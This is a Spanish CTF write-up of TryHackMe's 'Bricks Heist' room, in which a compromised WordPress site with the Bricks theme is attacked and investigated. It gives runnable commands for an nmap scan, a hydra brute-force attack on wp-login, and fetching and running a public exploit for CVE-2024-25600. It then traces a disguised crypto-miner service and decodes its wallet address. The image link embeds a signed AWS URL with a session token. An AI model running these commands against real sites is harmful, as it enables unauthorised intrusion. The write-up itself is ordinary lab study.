---
title: "trikc"
platform: "THM"
publishedAt: 2025-05-09
cover: "/images/ctf/bricks-heist.webp"
---

---


# 🧱 TryHackMe – Bricks Heist | Write-up técnico


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5e19dbac-6f69-4b8e-8f73-8ef638bf2a2c/8415f495-a0a4-4a8d-b258-ce28be57dfa6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666TCRUJRC%2F20250511%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250511T034514Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAsaCXVzLXdlc3QtMiJGMEQCIBBFful9ZtCg1w5BIy8U7fdpsiSnGWpZS8k4iUW8rXKsAiAyQ8oB56aJkwOUIsy2u8IjaeelTme2LjXOTTzrixAFDiqIBAi0%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMBuXNYd5ARAV8f66TKtwDyduNTi36c2lp%2Fgiow8sUbYtjZjqzPsR299%2Brx4RDw9%2BH9TyDrVEooWolvAL3sZyYhBKoa83bxqkSWrwwXkxY89LyNuQjWF3aItxsX6Bh8zUNlZ8jQY2pMXz6F1lmOC8x7V2XmSqKT2qJA81%2BqG6TMruV0nG%2F%2Bv4dZNJD59oUU%2F5%2FQYomW2tP8Hb1ZBvjHz6Zc6WS5Xvp1NKbiFm1n3%2FlIFRs3ov%2FotDm88yQ9Xvp7eWA7fHYB8rNZjCwro7byHl54cR3dwmyq1qm8OMoari1vXbAGqYlEU35x%2BvyDs8EbtlH2f9XVe5d%2BWv0bU5hTXUFc%2FUWSRV9eGBbOOqoYRglS61EqvzdeFTSV%2FbwYPegRNRG5IK0%2BCZb3xDm8dfFTkz3ym9UTI7oHDENSpYsU1F94EBck7YV%2Bw5UI6FMuiDBriElFmr2grqZj4HgdBBlrtznUZxxCUKIDqlTuxyp6Vbc5nvT9bIxYKSch7YjTyjFNcrSY261zujnT048fx4nn6wFTiGEX%2B1YiMcXa37c8AJatFKM0BnV9VNFaBR2eLf%2FTmmYOn6NcwTDHrRXcOhkdK0T9W80t2RCkbaImfVsXyO8MHgpvlvM9FNZ7G9Nap%2BWYmVjkQQCsavF%2Fdt6AUsw8JyAwQY6pgHhKwvZXw6NfUVNbBaBkVbJg6WuSnCgdTM2ehytJzoS9uo2pt%2Fs6b8Ue0pJH6lcfacA1k9Gxb6OPAylS5jfjmCkrrT4OEvypcaO5Ip11TOKSxqnhUhACWLTOqNdR0wgZEk6GKa2MxVlfcopYwnBzmjBNE3uKk%2FFVTKct5NpT8hEgOfn7jASj1gSRp%2B4M6SlVjvQfykBEz3kFT4Cd3RpMsH4XDr7fLlg&X-Amz-Signature=74bff9a88d5b09e6e5f049e89ee13deb31364ade97e2c4744744af7103a8e8c3&X-Amz-SignedHeaders=host&x-id=GetObject)


En este reto de TryHackMe nos enfrentamos a un escenario en el que un sitio WordPress ha sido comprometido por un actor malicioso. Nuestra misión es investigar, identificar cómo se produjo el ataque, qué malware fue desplegado, y qué grupo está detrás.


---


## 🔍 Reconocimiento inicial


Comenzamos con un escaneo completo:


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Se detectan los siguientes servicios:

- **22/tcp** – OpenSSH
- **80/tcp** – WebSockify (retorna error 405)
- **443/tcp** – Apache + WordPress 6.5
- **3306/tcp** – MySQL (sin autenticación)

---


## 🎯 Enumeración de WordPress


Usando `curl` y `wpscan`, identificamos que el tema activo es **Bricks**.


Al buscar vulnerabilidades conocidas, encontramos el CVE:

- **CVE-2024-25600**: vulnerabilidad crítica que permite ejecución remota de comandos desde el editor del tema Bricks.

---


## 🔓 Acceso inicial


Tras enumerar el usuario `administrator`, ejecutamos fuerza bruta con `hydra` y obtenemos acceso:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💥 Explotación del CVE


Usamos el exploit público para el CVE-2024-25600:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```


Al ejecutarlo con credenciales válidas, logramos ejecutar comandos remotos y abrir una **shell interactiva**:


```shell
bash
CopyEdit
python3 CVE-2024-25600.py --url https://bricks.thm --username administrator --password ***** --cmd id
```


---


## 🐚 Post-explotación


Accedemos a `/var/www/html/` y encontramos la flag inicial:


```plain text
CopyEdit
THM{fl46_650c844110baced87e1606453b93f22a}
```


Revisamos los procesos activos y servicios del sistema, encontrando uno sospechoso:


```shell
bash
CopyEdit
ubuntu.service - TRYHACK3M
ExecStart=/lib/NetworkManager/nm-inet-dialog
```


El proceso asociado es: `nm-inet-dialog`.


---


## 📁 Análisis del miner


Identificamos el archivo de log del minero en:


```shell
bash
CopyEdit
/lib/NetworkManager/inet.conf
```


Este archivo contiene líneas como:


```plain text
css
CopyEdit
[*] Bitcoin Miner Thread Started
```


Y una clave codificada como:


```plain text
makefile
CopyEdit
ID: WW1NeGNY...
```


---


## 🔓 Decodificación de wallet


Decodificando el valor de `ID` en base64 (dos veces), obtenemos:


```plain text
nginx
CopyEdit
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```


Una dirección de Bitcoin válida (Bech32) usada para recibir ganancias del minero.


---


## 🕵️ Asociación con grupo de amenazas


Rastreando la dirección en fuentes OSINT, encontramos que ha sido usada en transacciones ligadas al grupo de ransomware **LockBit**.


---


## ✅ Conclusión


Este reto combina:

- Enumeración de WordPress
- Explotación real de CVE
- Escalada post-explotación
- Análisis forense y OSINT

**Una práctica redonda** para cualquier profesional de ciberseguridad ofensiva o defensiva.

